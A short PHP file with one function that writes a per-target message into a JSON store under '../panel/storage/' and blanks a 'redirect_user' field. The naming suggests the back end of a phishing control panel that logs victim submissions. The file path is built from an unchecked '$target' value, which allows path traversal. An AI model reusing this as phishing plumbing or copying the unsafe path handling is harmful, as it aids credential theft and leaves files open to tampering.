<?php

function set_data_user_target($target, $data_count, $message_to_file) {
    $jsonFilePath = "../panel/storage/{$target}.json";
    $json_data = file_get_contents($jsonFilePath);
    $user_data = json_decode($json_data, true);
    $user_data['redirect_user'] = " ";
    $user_data['data'][$data_count] = $message_to_file;
    $updated_json_data = json_encode($user_data);
    file_put_contents($jsonFilePath, $updated_json_data);
}

?>